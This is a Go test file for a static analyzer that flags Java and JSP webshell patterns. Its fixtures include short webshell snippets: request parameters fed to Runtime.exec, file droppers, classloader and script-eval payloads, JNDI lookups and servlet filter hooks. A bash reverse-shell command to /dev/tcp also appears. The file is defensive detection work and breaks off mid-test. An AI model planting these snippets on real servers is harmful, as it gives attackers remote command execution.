package javadisk

import "testing"

func hasRule(fs []Finding, rule string) bool {
	for _, f := range fs {
		if f.Rule == rule {
			return true
		}
	}
	return false
}

func TestAnalyzeDetectsRequestToRuntimeExec(t *testing.T) {
	src := []byte(`<% String c=request.getParameter("cmd"); Runtime.getRuntime().exec(c); %>`)
	fs := Analyze("shell.jsp", src)
	if !hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("want request-exec, got %+v", fs)
	}
}

func TestAnalyzeDetectsDirectRequestToRuntimeExec(t *testing.T) {
	src := []byte(`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`)
	if fs := Analyze("shell.jsp", src); !hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("want request-exec, got %+v", fs)
	}
}

func TestAnalyzeDetectsRequestToSpacedRuntimeExec(t *testing.T) {
	src := []byte(`<% Runtime . getRuntime ( ) . exec ( request . getParameter ( "cmd" ) ); %>`)
	if fs := Analyze("shell.jsp", src); !hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("want request-exec through spaced Runtime call, got %+v", fs)
	}
}

func TestAnalyzeDetectsRequestToSpacedProcessBuilder(t *testing.T) {
	src := []byte(`<% new ProcessBuilder ( request . getParameter ( "cmd" ) ) . start ( ); %>`)
	if fs := Analyze("shell.jsp", src); !hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("want request-exec through spaced ProcessBuilder call, got %+v", fs)
	}
}

func TestAnalyzeDetectsAssignedRequestToRuntimeExec(t *testing.T) {
	src := []byte(`<% String c=request.getParameter("cmd"); Runtime.getRuntime().exec(c); %>`)
	if fs := Analyze("shell.jsp", src); !hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("want request-exec, got %+v", fs)
	}
}

func TestAnalyzeDoesNotTreatServletRequestIdentifierAsInput(t *testing.T) {
	src := []byte(`<% String servletRequestCommand="/usr/bin/id"; Runtime.getRuntime().exec(servletRequestCommand); %>`)
	if fs := Analyze("shell.jsp", src); hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("trusted servletRequest-named variable should not flag, got %+v", fs)
	}
}

func TestAnalyzeDetectsRequestExecWithSemicolonInParameterName(t *testing.T) {
	src := []byte(`<% Runtime.getRuntime().exec(request.getParameter("cmd;mode")); %>`)
	fs := Analyze("shell.jsp", src)
	if !hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("want request-exec, got %+v", fs)
	}
}

func TestAnalyzeDetectsFileDropper(t *testing.T) {
	src := []byte(`<% String p=application.getRealPath("/") + "/x.jsp"; new java.io.FileOutputStream(p).write(request.getParameter("x").getBytes()); %>`)
	fs := Analyze("dropper.jsp", src)
	if !hasRule(fs, "javadisk:file-drop-on-request") {
		t.Fatalf("want file-drop-on-request, got %+v", fs)
	}
}

func TestAnalyzeDetectsClassloaderPayload(t *testing.T) {
	src := []byte(`<% byte[] b=java.util.Base64.getDecoder().decode(request.getParameter("c")); new MyLoader().defineClass(b,0,b.length); %>`)
	fs := Analyze("loader.jsp", src)
	if !hasRule(fs, "javadisk:dynamic-classload") {
		t.Fatalf("want dynamic-classload, got %+v", fs)
	}
}

func TestAnalyzeDetectsScriptEngine(t *testing.T) {
	src := []byte(`<% new javax.script.ScriptEngineManager().getEngineByName("js").eval(request.getParameter("x")); %>`)
	fs := Analyze("script.jsp", src)
	if !hasRule(fs, "javadisk:scriptengine-eval") {
		t.Fatalf("want scriptengine-eval, got %+v", fs)
	}
}

func TestAnalyzeDetectsScriptEngineAcrossStatements(t *testing.T) {
	src := []byte(`<% ScriptEngine e = new javax.script.ScriptEngineManager().getEngineByName("js"); e.eval(request.getParameter("x")); %>`)
	if fs := Analyze("script.jsp", src); !hasRule(fs, "javadisk:scriptengine-eval") {
		t.Fatalf("want scriptengine-eval, got %+v", fs)
	}
}

func TestAnalyzeDetectsFileDropperAcrossStatements(t *testing.T) {
	src := []byte(`<% String p=application.getRealPath("/") + "/x.jsp"; FileOutputStream out = new FileOutputStream(p); byte[] b=request.getParameter("x").getBytes(); out.write(b); %>`)
	if fs := Analyze("dropper.jsp", src); !hasRule(fs, "javadisk:file-drop-on-request") {
		t.Fatalf("want file-drop-on-request, got %+v", fs)
	}
}

func TestAnalyzeDetectsRequestWriteThroughFileWriterConstructor(t *testing.T) {
	src := []byte(`<% String p="/tmp/x.jsp"; new java.io.FileOutputStream(p).write(request.getParameter("x").getBytes()); %>`)
	if fs := Analyze("dropper.jsp", src); !hasRule(fs, "javadisk:file-drop-on-request") {
		t.Fatalf("want file-drop-on-request, got %+v", fs)
	}
}

func TestAnalyzeDetectsRequestWriteThroughTrackedFileWriter(t *testing.T) {
	src := []byte(`<% String p="/tmp/x.jsp"; FileOutputStream out = new FileOutputStream(p); byte[] b=request.getParameter("x").getBytes(); out.write(b); %>`)
	if fs := Analyze("dropper.jsp", src); !hasRule(fs, "javadisk:file-drop-on-request") {
		t.Fatalf("want file-drop-on-request, got %+v", fs)
	}
}

func TestAnalyzeDetectsRequestWriteThroughFilesWrite(t *testing.T) {
	src := []byte(`<% Files.write(Paths.get("/tmp/x.jsp"), request.getParameter("x").getBytes()); %>`)
	if fs := Analyze("dropper.jsp", src); !hasRule(fs, "javadisk:file-drop-on-request") {
		t.Fatalf("want file-drop-on-request, got %+v", fs)
	}
}

func TestAnalyzeDoesNotTreatQuotedFileWriterMarkersAsWriterContext(t *testing.T) {
	src := []byte(`<% Writer output = writerFactory.open("fileoutputstream .jsp"); output.write(request.getParameter("x")); %>`)
	if fs := Analyze("view.jsp", src); hasRule(fs, "javadisk:file-drop-on-request") {
		t.Fatalf("quoted writer markers should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotFlagJavaLineComment(t *testing.T) {
	src := []byte(`<% // Runtime.getRuntime().exec(request.getParameter("cmd"));
out.print("http://example.test"); %>`)
	if fs := Analyze("comment.jsp", src); len(fs) != 0 {
		t.Fatalf("line comment should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotFlagJavaBlockComment(t *testing.T) {
	src := []byte(`<% /* new java.io.FileOutputStream("/x.jsp").write(request.getParameter("x").getBytes()); */ %>`)
	if fs := Analyze("comment.jsp", src); len(fs) != 0 {
		t.Fatalf("block comment should not flag, got %+v", fs)
	}
}

func TestAnalyzeDetectsReverseShellLiteral(t *testing.T) {
	src := []byte(`<% Runtime.getRuntime().exec("bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"); %>`)
	if fs := Analyze("shell.jsp", src); !hasRule(fs, "javadisk:reverse-shell-literal") {
		t.Fatalf("want reverse-shell-literal, got %+v", fs)
	}
}

func TestAnalyzeDoesNotFlagReverseShellLiteralOutsideExecArguments(t *testing.T) {
	src := []byte(`<% if (mode.equals("powershell")) Runtime.getRuntime().exec("/usr/bin/id"); %>`)
	if fs := Analyze("shell.jsp", src); hasRule(fs, "javadisk:reverse-shell-literal") {
		t.Fatalf("reverse-shell literal outside exec arguments should not flag, got %+v", fs)
	}
}

func TestAnalyzeDetectsDeserializationJNDI(t *testing.T) {
	src := []byte(`<% new javax.naming.InitialContext().lookup("ldap://example.test/a"); %>`)
	if fs := Analyze("lookup.jsp", src); !hasRule(fs, "javadisk:deserialization-jndi") {
		t.Fatalf("want deserialization-jndi, got %+v", fs)
	}
}

func TestAnalyzeDetectsServletHookRegistration(t *testing.T) {
	src := []byte(`<% servletContext.addFilter("shell", new Filter()); %>`)
	if fs := Analyze("hook.jsp", src); !hasRule(fs, "javadisk:servlet-hook-registration") {
		t.Fatalf("want servlet-hook-registration, got %+v", fs)
	}
}

func TestAnalyzeDoesNotFlagBenignRequestRendering(t *testing.T) {
	src := []byte(`<% String q=request.getParameter("q"); out.print(q); %>`)
	fs := Analyze("view.jsp", src)
	if len(fs) != 0 {
		t.Fatalf("benign request rendering should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotFlagUnrelatedRequestAndTrustedExec(t *testing.T) {
	src := []byte(`<% String q=request.getParameter("q"); out.print(q); Runtime.getRuntime().exec("/usr/bin/id"); %>`)
	if fs := Analyze("view.jsp", src); hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("unrelated request and trusted exec should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotTreatRequestAPITextInExecLiteralAsInput(t *testing.T) {
	src := []byte(`<% Runtime.getRuntime().exec("echo request.getParameter"); %>`)
	if fs := Analyze("view.jsp", src); hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("request API text in exec literal should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotTreatQuotedRuntimeMarkerAsExecSink(t *testing.T) {
	src := []byte(`<% "runtime.getruntime().exec"; helper.exec(request.getParameter("x")); %>`)
	if fs := Analyze("view.jsp", src); hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("quoted Runtime marker should not make helper.exec a process sink, got %+v", fs)
	}
}

func TestAnalyzeDoesNotFlagBareReverseShellLiteral(t *testing.T) {
	src := []byte(`<% String documentation="cmd.exe powershell /dev/tcp/ bash -i"; out.print(documentation); %>`)
	if fs := Analyze("notes.jsp", src); hasRule(fs, "javadisk:reverse-shell-literal") {
		t.Fatalf("bare reverse-shell literal should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotDetectReverseShellOutsideJavaJSPPaths(t *testing.T) {
	src := []byte(`Runtime.getRuntime().exec("bash -i >& /dev/tcp/127.0.0.1/4444 0>&1")`)
	if fs := Analyze("notes.txt", src); hasRule(fs, "javadisk:reverse-shell-literal") {
		t.Fatalf("non-Java/JSP path should not flag reverse shell, got %+v", fs)
	}
}

func TestAnalyzeDoesNotFlagUnrelatedRequestAndConstantScriptEngineEval(t *testing.T) {
	src := []byte(`<% String q=request.getParameter("q"); new javax.script.ScriptEngineManager().getEngineByName("js").eval("1+1"); %>`)
	if fs := Analyze("script.jsp", src); hasRule(fs, "javadisk:scriptengine-eval") {
		t.Fatalf("unrelated request and constant script eval should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotTreatQuotedScriptEngineMarkerAsFactory(t *testing.T) {
	src := []byte(`<% "scriptenginemanager"; helper.eval(request.getParameter("x")); %>`)
	if fs := Analyze("script.jsp", src); hasRule(fs, "javadisk:scriptengine-eval") {
		t.Fatalf("quoted ScriptEngine marker should not make helper.eval a script sink, got %+v", fs)
	}
}

func TestAnalyzeDoesNotFlagUnrelatedRequestAndTrustedExecutableWrite(t *testing.T) {
	src := []byte(`<% String q=request.getParameter("q"); String p=application.getRealPath("/")+"/x.jsp"; new java.io.FileOutputStream(p).write("trusted".getBytes()); %>`)
	if fs := Analyze("dropper.jsp", src); hasRule(fs, "javadisk:file-drop-on-request") {
		t.Fatalf("unrelated request and trusted executable write should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotFlagUnrelatedRequestAndReflection(t *testing.T) {
	src := []byte(`<% String q=request.getParameter("q"); Class.forName("java.lang.System").getMethod("gc").invoke(null); %>`)
	if fs := Analyze("reflect.jsp", src); hasRule(fs, "javadisk:reflection-invoke") {
		t.Fatalf("unrelated request and reflection should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotTreatQuotedReflectionMarkerAsReflectionSink(t *testing.T) {
	src := []byte(`<% "class.forname"; helper.invoke(request.getParameter("x")); %>`)
	if fs := Analyze("reflect.jsp", src); hasRule(fs, "javadisk:reflection-invoke") {
		t.Fatalf("quoted reflection marker should not make helper.invoke a reflection sink, got %+v", fs)
	}
}

func TestAnalyzeDoesNotTaintTrustedExecAfterConditionalRequestCheck(t *testing.T) {
	src := []byte(`<% if (request.getParameter("q") != null) Runtime.getRuntime().exec("/usr/bin/id"); %>`)
	if fs := Analyze("shell.jsp", src); hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("conditional request check and trusted exec should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotTaintTrustedScriptEvalAfterConditionalRequestCheck(t *testing.T) {
	src := []byte(`<% if (request.getParameter("q") != null) new javax.script.ScriptEngineManager().getEngineByName("js").eval("1+1"); %>`)
	if fs := Analyze("script.jsp", src); hasRule(fs, "javadisk:scriptengine-eval") {
		t.Fatalf("conditional request check and trusted script eval should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotTaintTrustedExecutableWriteAfterConditionalRequestCheck(t *testing.T) {
	src := []byte(`<% String p="/tmp/x.jsp"; if (request.getParameter("q") != null) new java.io.FileOutputStream(p).write("trusted".getBytes()); %>`)
	if fs := Analyze("dropper.jsp", src); hasRule(fs, "javadisk:file-drop-on-request") {
		t.Fatalf("conditional request check and trusted executable write should not flag, got %+v", fs)
	}
}

func TestAnalyzeDetectsDirectRequestInReflectionInvoke(t *testing.T) {
	src := []byte(`<% Class.forName("java.lang.System").getMethod("gc").invoke(request.getParameter("target")); %>`)
	if fs := Analyze("reflect.jsp", src); !hasRule(fs, "javadisk:reflection-invoke") {
		t.Fatalf("want reflection-invoke, got %+v", fs)
	}
}

func TestAnalyzeDoesNotFlagDeserializationJNDIStrings(t *testing.T) {
	src := []byte(`<% String documentation="ObjectInputStream readObject resolveClass InitialContext lookup ldap:// rmi:// jdbcRowSetImpl"; out.print(documentation); %>`)
	if fs := Analyze("notes.jsp", src); hasRule(fs, "javadisk:deserialization-jndi") {
		t.Fatalf("deserialization/JNDI strings should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotTreatRequestAPITextInJavaLiteralAsDeserializationSource(t *testing.T) {
	src := []byte(`class Lookup { void run() throws Exception { new javax.naming.InitialContext().lookup("ldap://example.test/a"); String documentation = "request.getParameter"; } }`)
	if fs := Analyze("Lookup.java", src); hasRule(fs, "javadisk:deserialization-jndi") {
		t.Fatalf("request API text in a Java literal should not flag deserialization/JNDI, got %+v", fs)
	}
}

func TestAnalyzeDetectsDeserializationJNDIExecutableContext(t *testing.T) {
	src := []byte(`<% new javax.naming.InitialContext().lookup("ldap://example.test/a"); %>`)
	if fs := Analyze("lookup.jsp", src); !hasRule(fs, "javadisk:deserialization-jndi") {
		t.Fatalf("want deserialization-jndi, got %+v", fs)
	}
}

func TestAnalyzeDoesNotFlagJNDIContextWithoutLookupURL(t *testing.T) {
	src := []byte(`<% new javax.naming.InitialContext(); %>`)
	if fs := Analyze("lookup.jsp", src); hasRule(fs, "javadisk:deserialization-jndi") {
		t.Fatalf("InitialContext without lookup URL should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotPairTrustedJNDILookupWithUnrelatedURLText(t *testing.T) {
	src := []byte(`<% String documentation="ldap://example.test/a"; new javax.naming.InitialContext().lookup("java:comp/env/jdbc/foo"); %>`)
	if fs := Analyze("lookup.jsp", src); hasRule(fs, "javadisk:deserialization-jndi") {
		t.Fatalf("unrelated LDAP documentation should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotFlagClassloadDocumentationString(t *testing.T) {
	src := []byte(`<% String documentation="defineClass Base64 classloader"; out.print(documentation); %>`)
	if fs := Analyze("notes.jsp", src); hasRule(fs, "javadisk:dynamic-classload") {
		t.Fatalf("classload documentation string should not flag, got %+v", fs)
	}
}

func TestAnalyzeDoesNotFlagServletHookRegistrationStrings(t *testing.T) {
	src := []byte(`<% String documentation="addFilter addServlet addInterceptor addListener FilterRegistration ServletRegistration"; out.print(documentation); %>`)
	if fs := Analyze("notes.jsp", src); hasRule(fs, "javadisk:servlet-hook-registration") {
		t.Fatalf("servlet hook strings should not flag, got %+v", fs)
	}
}

func TestAnalyzeDetectsServletHookRegistrationCall(t *testing.T) {
	src := []byte(`<% servletContext.addListener(new Listener()); %>`)
	if fs := Analyze("hook.jsp", src); !hasRule(fs, "javadisk:servlet-hook-registration") {
		t.Fatalf("want servlet-hook-registration, got %+v", fs)
	}
}

func TestAnalyzeKillsFactsOnReassignment(t *testing.T) {
	tests := []struct {
		name string
		src  string
		rule string
	}{
		{
			name: "tainted value",
			src:  `<% String cmd=request.getParameter("x"); cmd="trusted"; Runtime.getRuntime().exec(cmd); %>`,
			rule: "javadisk:request-exec",
		},
		{
			name: "executable path",
			src:  `<% String p="/tmp/x.jsp"; p="/tmp/x.log"; new FileOutputStream(p).write(request.getParameter("x")); %>`,
			rule: "javadisk:file-drop-on-request",
		},
		{
			name: "executable writer",
			src:  `<% FileOutputStream out=new FileOutputStream("/tmp/x.jsp"); out=trustedWriter; out.write(request.getParameter("x")); %>`,
			rule: "javadisk:file-drop-on-request",
		},
		{
			name: "script engine",
			src:  `<% ScriptEngine engine=new ScriptEngineManager().getEngineByName("js"); engine=trustedEngine; engine.eval(request.getParameter("x")); %>`,
			rule: "javadisk:scriptengine-eval",
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if fs := Analyze("reassigned.jsp", []byte(test.src)); hasRule(fs, test.rule) {
				t.Fatalf("overwritten fact should not flag %s, got %+v", test.rule, fs)
			}
		})
	}
}

func TestAnalyzeDoesNotParseEqualityAsAssignment(t *testing.T) {
	src := []byte(`<% if (cmd == request.getParameter("x")) Runtime.getRuntime().exec(cmd); %>`)
	if fs := Analyze("compare.jsp", src); hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("equality comparison should not taint cmd, got %+v", fs)
	}
}

func TestAnalyzeRequiresKnownRequestReceiver(t *testing.T) {
	tests := []struct {
		name string
		src  string
	}{
		{
			name: "response header",
			src:  `<% Runtime.getRuntime().exec(response.getHeader("command")); %>`,
		},
		{
			name: "archive input stream",
			src:  `<% Runtime.getRuntime().exec(archive.getInputStream()); %>`,
		},
		{
			name: "process input stream",
			src:  `<% Runtime.getRuntime().exec(process.getInputStream()); %>`,
		},
		{
			name: "custom parameter receiver",
			src:  `<% Runtime.getRuntime().exec(commandSource.getParameter("command")); %>`,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if fs := Analyze("receiver.jsp", []byte(test.src)); hasRule(fs, "javadisk:request-exec") {
				t.Fatalf("unknown request receiver should not flag, got %+v", fs)
			}
		})
	}
}

func TestAnalyzeTracksRequestReceiverAliases(t *testing.T) {
	tests := []struct {
		name string
		path string
		src  string
	}{
		{
			name: "page context alias",
			path: "alias.jsp",
			src:  `<% Object req=pageContext.getRequest(); Runtime.getRuntime().exec(req.getParameter("command")); %>`,
		},
		{
			name: "typed servlet request",
			path: "Alias.java",
			src:  `class Alias { void run(HttpServletRequest source) throws Exception { HttpServletRequest req=source; Runtime.getRuntime().exec(req.getParameter("command")); } }`,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if fs := Analyze(test.path, []byte(test.src)); !hasRule(fs, "javadisk:request-exec") {
				t.Fatalf("want request-exec through known request alias, got %+v", fs)
			}
		})
	}
}

func TestAnalyzeDetectsRequestToProcessBuilder(t *testing.T) {
	src := []byte(`<% new ProcessBuilder(request.getParameter("command")).start(); %>`)
	if fs := Analyze("process.jsp", src); !hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("want request-exec through ProcessBuilder, got %+v", fs)
	}
}

func TestAnalyzeRequiresKnownJNDIContextReceiver(t *testing.T) {
	src := []byte(`<% directory.lookup("ldap://example.test/a"); %>`)
	if fs := Analyze("lookup.jsp", src); hasRule(fs, "javadisk:deserialization-jndi") {
		t.Fatalf("generic lookup receiver should not flag, got %+v", fs)
	}
}

func TestAnalyzeDetectsTrackedJNDIContextLookup(t *testing.T) {
	src := []byte(`<% InitialContext ctx=acquireContext(); ctx.lookup("rmi://example.test/a"); %>`)
	if fs := Analyze("lookup.jsp", src); !hasRule(fs, "javadisk:deserialization-jndi") {
		t.Fatalf("want deserialization-jndi through tracked InitialContext, got %+v", fs)
	}
}

func TestAnalyzeRequiresKnownServletContextReceiver(t *testing.T) {
	src := []byte(`<% registry.addListener(new Listener()); %>`)
	if fs := Analyze("hook.jsp", src); hasRule(fs, "javadisk:servlet-hook-registration") {
		t.Fatalf("generic hook receiver should not flag, got %+v", fs)
	}
}

func TestAnalyzeDetectsTrackedServletContextHook(t *testing.T) {
	tests := []string{
		`<% Object ctx=getServletContext(); ctx.addFilter("shell", new Filter()); %>`,
		`<% ServletContext ctx=acquireContext(); ctx.addFilter("shell", new Filter()); %>`,
	}
	for _, src := range tests {
		if fs := Analyze("hook.jsp", []byte(src)); !hasRule(fs, "javadisk:servlet-hook-registration") {
			t.Fatalf("want servlet-hook-registration through tracked ServletContext, got %+v", fs)
		}
	}
}

func TestAnalyzeDetectsReverseShellConstantAtExec(t *testing.T) {
	tests := []struct {
		path string
		src  string
	}{
		{
			path: "shell.jsp",
			src:  `<% String cmd="bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"; Runtime.getRuntime().exec(cmd); %>`,
		},
		{
			path: "Shell.java",
			src:  `class Shell { void run() throws Exception { String cmd="bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"; new ProcessBuilder(cmd).start(); } }`,
		},
	}

	for _, test := range tests {
		t.Run(test.path, func(t *testing.T) {
			if fs := Analyze(test.path, []byte(test.src)); !hasRule(fs, "javadisk:reverse-shell-literal") {
				t.Fatalf("want reverse-shell-literal from constant exec argument, got %+v", fs)
			}
		})
	}
}

func TestAnalyzeRequiresExecutablePathMarkerBoundary(t *testing.T) {
	for _, path := range []string{"/tmp/x.jsp.log", "/tmp/Example.class.txt", "/tmp/jarvis.log"} {
		t.Run(path, func(t *testing.T) {
			src := `<% new FileOutputStream("` + path + `").write(request.getParameter("x")); %>`
			if fs := Analyze("dropper.jsp", []byte(src)); hasRule(fs, "javadisk:file-drop-on-request") {
				t.Fatalf("non-executable suffix should not flag, got %+v", fs)
			}
		})
	}
}

func TestAnalyzeRequiresExecutablePathBoundaryAcrossLiteralConcatenation(t *testing.T) {
	tests := []string{
		`<% new FileOutputStream("/tmp/x.jsp" + ".log").write(request.getParameter("x")); %>`,
		`<% new FileOutputStream("/tmp/Example.class" + ".txt").write(request.getParameter("x")); %>`,
	}
	for _, src := range tests {
		if fs := Analyze("dropper.jsp", []byte(src)); hasRule(fs, "javadisk:file-drop-on-request") {
			t.Fatalf("concatenated non-executable suffix should not flag, got %+v", fs)
		}
	}
}

func TestAnalyzeDetectsExecutablePathBoundaries(t *testing.T) {
	for _, path := range []string{
		"/tmp/x.jsp",
		"/tmp/x.jspx",
		"/tmp/x.jspf",
		"/tmp/Example.class",
		"/tmp/payload.jar",
		"/srv/WEB-INF/classes/payload.bin",
		"/srv/WEB-INF/lib/payload.bin",
	} {
		t.Run(path, func(t *testing.T) {
			src := `<% new FileOutputStream("` + path + `").write(request.getParameter("x")); %>`
			if fs := Analyze("dropper.jsp", []byte(src)); !hasRule(fs, "javadisk:file-drop-on-request") {
				t.Fatalf("want file-drop-on-request for executable path %q, got %+v", path, fs)
			}
		})
	}
}

func TestAnalyzeDoesNotKeepExecutablePathAfterTransformation(t *testing.T) {
	src := []byte(`<% String p="/tmp/x.jsp"; p=p+".log"; new FileOutputStream(p).write(request.getParameter("x")); %>`)
	if fs := Analyze("dropper.jsp", src); hasRule(fs, "javadisk:file-drop-on-request") {
		t.Fatalf("transformed non-executable path should not flag, got %+v", fs)
	}
}

func TestAnalyzeDetectsTypedRequestReceivers(t *testing.T) {
	tests := []struct {
		name string
		src  string
	}{
		{
			name: "http servlet request method parameter",
			src:  `class Shell { void doGet(HttpServletRequest request, HttpServletResponse response) { Runtime.getRuntime().exec(request.getParameter("cmd")); } }`,
		},
		{
			name: "servlet request method parameter",
			src:  `class Shell { void doPost(ServletRequest req) { new ProcessBuilder(req.getParameter("cmd")).start(); } }`,
		},
		{
			name: "http servlet request field",
			src:  `class Shell { private HttpServletRequest inbound; void run() { Runtime.getRuntime().exec(inbound.getParameter("cmd")); } }`,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if fs := Analyze("Shell.java", []byte(test.src)); !hasRule(fs, "javadisk:request-exec") {
				t.Fatalf("want request-exec through typed request receiver, got %+v", fs)
			}
		})
	}
}

func TestAnalyzeRequiresObjectInputStreamReceiver(t *testing.T) {
	for _, src := range []string{
		`<% helper.readObject(); %>`,
		`<% api.resolveClass(); %>`,
	} {
		if fs := Analyze("view.jsp", []byte(src)); hasRule(fs, "javadisk:deserialization-jndi") {
			t.Fatalf("untracked deserialization receiver should not flag, got %+v", fs)
		}
	}
}

func TestAnalyzeDetectsObjectInputStreamReceivers(t *testing.T) {
	tests := []struct {
		name string
		src  string
	}{
		{name: "tracked receiver", src: `<% ObjectInputStream in=new ObjectInputStream(request.getInputStream()); in.readObject(); %>`},
		{name: "receiver alias", src: `<% ObjectInputStream in=new ObjectInputStream(request.getInputStream()); Object alias=in; alias.resolveClass(); %>`},
		{name: "direct receiver", src: `<% new ObjectInputStream(request.getInputStream()).readObject(); %>`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if fs := Analyze("deserialize.jsp", []byte(test.src)); !hasRule(fs, "javadisk:deserialization-jndi") {
				t.Fatalf("want deserialization-jndi through ObjectInputStream, got %+v", fs)
			}
		})
	}
}

func TestAnalyzeDetectsRequestControlledExpressionEvaluators(t *testing.T) {
	tests := []struct {
		name string
		src  string
	}{
		{name: "direct GroovyShell", src: `<% new groovy.lang.GroovyShell().evaluate(request.getParameter("x")); %>`},
		{name: "tracked GroovyShell", src: `<% groovy.lang.GroovyShell shell=new groovy.lang.GroovyShell(); shell.evaluate(request.getParameter("x")); %>`},
		{name: "OGNL", src: `<% Ognl.getValue(request.getParameter("x"), ctx); %>`},
		{name: "MVEL", src: `<% MVEL.eval(request.getParameter("x")); %>`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if fs := Analyze("evaluate.jsp", []byte(test.src)); !hasRule(fs, "javadisk:scriptengine-eval") {
				t.Fatalf("want scriptengine-eval through expression evaluator, got %+v", fs)
			}
		})
	}
}

func TestAnalyzeIgnoresQuotedExpressionEvaluatorMarkers(t *testing.T) {
	tests := []string{
		`<% String marker="groovyshell"; helper.evaluate(request.getParameter("x")); %>`,
		`<% String marker="ognl"; helper.getValue(request.getParameter("x"), ctx); %>`,
		`<% String marker="mvel"; helper.eval(request.getParameter("x")); %>`,
	}
	for _, src := range tests {
		if fs := Analyze("view.jsp", []byte(src)); hasRule(fs, "javadisk:scriptengine-eval") {
			t.Fatalf("quoted evaluator marker should not flag, got %+v", fs)
		}
	}
}

func TestAnalyzeFindingsHaveMetadata(t *testing.T) {
	src := []byte(`<% Runtime.getRuntime().exec(request.getParameter("cmd")); new FileOutputStream("/tmp/x.jsp").write(request.getParameter("x")); new MyLoader().defineClass(request.getParameter("c"),0,1); new ScriptEngineManager().getEngineByName("js").eval(request.getParameter("e")); Class.forName("X").getMethod("run").invoke(target, request.getParameter("r")); new InitialContext().lookup("ldap://example.test/a"); servletContext.addFilter("shell", new Filter()); %>`)
	findings := Analyze("metadata.jsp", src)
	if len(findings) == 0 {
		t.Fatal("metadata fixture should emit findings")
	}
	for _, finding := range findings {
		if finding.Score <= 0 || finding.Family == "" || finding.Evidence == "" {
			t.Fatalf("finding metadata must be populated, got %+v", finding)
		}
	}
}

func TestAnalyzePreservesExecutablePathExactAliases(t *testing.T) {
	src := []byte(`<% String p="/tmp/x.jsp"; String alias=p; new FileOutputStream(alias).write(request.getParameter("x")); %>`)
	if fs := Analyze("dropper.jsp", src); !hasRule(fs, "javadisk:file-drop-on-request") {
		t.Fatalf("want file-drop-on-request through exact path alias, got %+v", fs)
	}
}

func TestAnalyzeKeepsEscapedAPIMarkersInsideJavaStrings(t *testing.T) {
	tests := []struct {
		name string
		src  string
	}{
		{
			name: "request exec",
			src:  `<% String marker="\"; Runtime.getRuntime().exec(request.getParameter(\"cmd\")); //"; %>`,
		},
		{
			name: "script engine eval",
			src:  `<% String marker="\"; new ScriptEngineManager().getEngineByName(\"js\").eval(request.getParameter(\"x\")); //"; %>`,
		},
		{
			name: "JNDI lookup",
			src:  `<% String marker="\"; new InitialContext().lookup(\"ldap://example.test/a\"); //"; %>`,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if fs := Analyze("literal.jsp", []byte(test.src)); len(fs) != 0 {
				t.Fatalf("escaped API marker text should stay inside its literal, got %+v", fs)
			}
		})
	}
}

func TestAnalyzeStillDecodesUnicodeAndHexAPIObfuscation(t *testing.T) {
	src := []byte(`<% Runtime\u002egetRuntime()\x2eexec(request\u002egetParameter("cmd")); %>`)
	if fs := Analyze("obfuscated.jsp", src); !hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("want request-exec through unicode and hex API escapes, got %+v", fs)
	}
}

func TestAnalyzeKeepsForHeaderAssignmentsInOneStatement(t *testing.T) {
	src := []byte(`<% for (String cmd=request.getParameter("cmd"); cmd != null; cmd = null) { Runtime.getRuntime().exec(cmd); } %>`)
	if fs := Analyze("loop.jsp", src); !hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("want request-exec through for-loop initializer, got %+v", fs)
	}
}

func TestAnalyzeDoesNotLeakTypedRequestReceiversAcrossMethods(t *testing.T) {
	src := []byte(`class Scope {
	void typed(HttpServletRequest req) { audit(req); }
	void unrelated() {
		String req = "trusted";
		Runtime.getRuntime().exec(req.getParameter("cmd"));
	}
}`)
	if fs := Analyze("Scope.java", src); hasRule(fs, "javadisk:request-exec") {
		t.Fatalf("typed receiver facts must not leak into another method, got %+v", fs)
	}
}

func TestAnalyzeDoesNotLeakOtherTypedReceiversAcrossMethods(t *testing.T) {
	tests := []struct {
		name string
		src  string
		rule string
	}{
		{
			name: "ObjectInputStream",
			src: `class Scope {
	void typed(ObjectInputStream input) { audit(input); }
	void unrelated() { Helper input = helper(); input.readObject(); }
}`,
			rule: "javadisk:deserialization-jndi",
		},
		{
			name: "GroovyShell",
			src: `class Scope {
	void typed(GroovyShell shell) { audit(shell); }
	void unrelated(HttpServletRequest request) { Helper shell = helper(); shell.evaluate(request.getParameter("code")); }
}`,
			rule: "javadisk:scriptengine-eval",
		},
	}

